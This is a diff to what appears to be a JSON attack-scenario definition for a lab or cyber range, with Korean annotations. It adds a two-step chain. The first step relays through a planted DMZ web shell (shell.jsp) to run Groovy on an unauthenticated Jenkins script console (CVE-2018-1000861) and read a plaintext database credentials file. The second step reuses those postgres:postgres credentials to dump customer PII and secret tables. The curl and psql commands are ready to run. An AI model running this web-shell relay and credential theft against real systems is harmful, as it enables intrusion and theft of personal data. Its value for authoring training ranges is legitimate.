@@ -10,14 +10,17 @@
     "status": "AUTHORED",
     "steps": [
       {"id": "STEP-corp-jenkins-groovy", "seq": 1,
-       "command": "curl -s 'http://jenkins.corp-internal.svc.cluster.local:8080/script' --data-urlencode 'script=println new File(\"/opt/deploy/corp-db.properties\").text'",
-       "description": "스크립트 콘솔 Groovy 로 corp-db.properties 읽기(CVE-2018-1000861)"}
+       "command": "curl -s 'http://waf.corp-dmz.svc.cluster.local/shell.jsp?cmd=curl%20-s%20%27http%3A%2F%2Fjenkins.corp-internal.svc.cluster.local%3A8080%2Fscript%27%20--data-urlencode%20%27script%3Dprintln%20new%20File%28%22%2Fopt%2Fdeploy%2Fcorp-db.properties%22%29.text%27'",
+       "description": "★ DMZ 웹셸(shell.jsp)을 중계로 Jenkins 스크립트 콘솔 Groovy 실행. ext 발판에서 jenkins.corp-internal 로 직접 치면 NetworkPolicy 차단으로 timeout — 반드시 DMZ RCE(STEP-corp-tomcat-exec 선행) 발판에서 중계. 응답에 'db.user=postgres', 'db.password=postgres' 같은 평문 크라운 DB 자격증명 노출. Groovy 로 임의 파일 읽기(CVE-2018-1000861)."},
+      {"id": "STEP-corp-crown-select", "seq": 2,
+       "command": "curl -s 'http://waf.corp-dmz.svc.cluster.local/shell.jsp?cmd=psql%20postgresql%3A%2F%2Fpostgres%3Apostgres%40postgres.corp-crown.svc.cluster.local%3A5432%2Fpostgres%20-c%20%27SELECT%20%2A%20FROM%20customers%20LIMIT%2010%27'",
+       "description": "★ step1 에서 추출한 자격증명(postgres:postgres)으로 크라운 PostgreSQL 직접 접속 — 여전히 DMZ 웹셸 중계(internal→crown 은 NetworkPolicy 허용, ext→crown 은 차단). customers(PII)·ops_secrets 테이블 SELECT 로 크라운 반출 완료 — 이게 '진짜 flag' 다. T1213 Data from Information Repositories."}
     ]
   },
   "preconditions": [
     {"id": "PRE-corp-jenkins-console",
-     "name": "미인증 스크립트 콘솔 + 배포파일 존재",
-     "description": "내부 도달로 Jenkins 스크립트 콘솔에 인증 없이 접근 가능하고, /opt/deploy/corp-db.properties 에 평문 크라운 DB 자격증명이 보관돼 있음."}
+     "name": "DMZ RCE 선행 + 미인증 스크립트 콘솔 + 배포파일 존재",
+     "description": "DMZ RCE(STEP-corp-tomcat-exec 등 웹셸 획득) 선행 필수 — ext→internal 은 NetworkPolicy 로 차단되므로 Jenkins 로 직접 못 감. DMZ RCE 발판을 중계로 Jenkins 스크립트 콘솔에 인증 없이 접근 가능하고, /opt/deploy/corp-db.properties 에 평문 크라운 DB 자격증명(postgres:postgres)이 보관됨."}
   ],
   "expected_results": [
     {"id": "ER-corp-jenkins-progress-cred",
